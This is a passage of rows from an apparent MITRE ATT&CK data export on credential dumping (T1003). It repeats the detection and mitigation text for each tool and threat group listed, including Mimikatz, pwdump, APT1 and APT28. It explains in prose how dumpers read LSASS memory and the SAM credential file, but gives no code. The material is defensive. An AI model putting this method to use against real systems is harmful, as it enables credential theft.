[[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
32,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']",['[[Group/G0004|Ke3chang]] dumps credentials.[[CiteRef::Villeneuve et al 2014]]'],['Ke3chang'],['Ke3chang'],['G0004'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
33,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']",['[[Software/S0008|gsecdump]] can dump Windows password hashes and LSA secrets.[[CiteRef::TrueSec Gsecdump]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],Software: gsecdump,['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
34,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']",[u'[[Software/S0119|Cachedump]] can extract cached password hashes from a system\u2019s registry.[[CiteRef::Mandiant APT1]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],Software: Cachedump,['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
35,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']",['[[Software/S0121|Lslsass]] can dump active logon session password hashes from the lsass process.[[CiteRef::Mandiant APT1]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],Software: Lslsass,['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
36,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']","['[[Software/S0002|Mimikatz]] performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from LSA, SAM table, credential vault, and DCSync.[[CiteRef::Deply Mimikatz]][[CiteRef::GitHub Mimikatz lsadump Module]]']",['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],Software: Mimikatz,['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
37,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']",['[[Software/S0006|pwdump]] can be used to dump credentials.[[CiteRef::Wikipedia pwdump]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],Software: pwdump,['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
38,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']",['[[Group/G0006|APT1]] has been known to use credential dumping.[[CiteRef::Mandiant APT1]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
39,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']","['[[Software/S0002|Mimikatz]] performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from LSA, SAM table, credential vault, and DCSync.[[CiteRef::Deply Mimikatz]][[CiteRef::GitHub Mimikatz lsadump Module]]']",['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],Software: Mimikatz,['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
40,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']","['[[Software/S0138|OLDBAIT]] collects credentials from Internet Explorer, Mozilla Firefox, Eudora, and several email clients.[[CiteRef::FireEye APT28]]']",['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],"Software: OLDBAIT, Sasfis",['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
41,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']",['[[Group/G0007|APT28]] regularly deploys both publicly available and custom password retrieval tools on victims.[[CiteRef::ESET Sednit Part 2]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] 